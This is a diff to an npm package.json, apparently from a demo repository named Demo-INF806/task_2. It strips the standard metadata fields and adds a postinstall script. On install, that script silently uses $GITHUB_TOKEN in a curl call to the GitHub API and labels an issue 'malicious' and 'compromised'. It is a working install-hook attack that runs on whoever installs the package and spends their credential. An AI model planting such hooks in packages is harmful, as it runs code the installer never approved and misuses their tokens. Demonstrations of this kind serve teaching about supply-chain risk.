@@ -1,11 +1,8 @@
 {
   "name": "task_2",
   "version": "1.0.0",
-  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "postinstall": "curl -X POST https://api.github.com/repos/Demo-INF806/task_2/issues/1/labels -H 'Authorization: token $GITHUB_TOKEN' -d '[\"malicious\", \"compromised\"]'"
   },
-  "author": "",
-  "license": "ISC",
-  "description": ""
+  "dependencies": {}
 }
